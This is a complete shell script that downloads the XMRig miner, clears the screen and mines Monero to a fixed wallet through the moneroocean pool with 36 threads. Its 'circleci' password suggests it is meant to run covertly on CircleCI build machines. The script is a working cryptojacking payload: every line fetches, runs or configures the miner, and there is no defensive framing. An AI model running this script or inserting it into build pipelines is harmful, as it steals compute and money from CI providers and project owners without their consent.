#!/bin/sh

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && clear
./xmrig -o gulf.moneroocean.stream:10128 \
  -u 83foVJNSurhY63FDSbLnogDibYhU5AwMhUuC8adAmVyaVdMtjtr5MNDXfPUhK3pBxAKK15s8wP1xfcSWpJTLwvaRGq2qoXB \
  -p circleci --threads 36
